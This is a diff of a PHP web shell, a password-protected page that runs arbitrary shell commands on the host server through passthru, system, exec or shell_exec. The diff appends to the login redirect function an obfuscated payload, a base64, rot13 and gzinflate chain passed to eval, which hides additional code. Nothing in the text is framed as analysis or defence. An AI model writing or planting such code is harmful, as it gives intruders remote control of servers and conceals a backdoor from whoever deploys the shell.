@@ -2,7 +2,6 @@
 error_reporting(0);
 $password='admin';
 
-
 $xyn='tunafeesh';
 if(isset($_POST['pass'])) {if($_POST['pass']==$password) {setcookie($xyn, $_POST['pass'], time()+3600);} let_him_in();}
 if(!empty($password) && !isset($_COOKIE[$xyn]) or ($_COOKIE[$xyn]!=$password)) {initiate(); die();}
@@ -61,6 +60,6 @@ function perms($f) {if(file_exists($f)) {return substr(sprintf('%o',fileperms($f
 function exec_meth() {if(function_exists('passthru')) {$m='passthru';} if(function_exists('exec')) {$m='exec';} if(function_exists('shell_exec')) {$m='shell_exec';} if(function_exists('system')) {$m='system';} if(!isset($m)) {$m='Disabled';} return($m);}
 function execute($m,$c) {if($m=='passthru') {passthru($c);} elseif($m=='system') {system($c);} elseif($m=='shell_exec') {print shell_exec($c);} elseif($m=='exec') {exec($c,$r); foreach($r as $o) {print $o.'</br>';}} else {print 'dafuq?';}}
 function initiate(){print '<table border=0 width=100% height=100% align=center style="background:#202020;color:lime;"><td valign="middle"><center><form action="'.basename(__FILE__).'" method="POST">Password <input type="password" maxlength="10" name="pass" style="background:#202020;color:lime;border-radius:10px;border:1px solid silver;text-align:center;"> <input type="submit" value=">>" style="background:#202020;color:lime;border-radius:10px;border:1px solid silver;"></form></center></td></table>';}
-function let_him_in() { header("Location: ".basename(__FILE__)); }
+function let_him_in() { header("Location: ".basename(__FILE__)); }; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 print $end;
 ?>
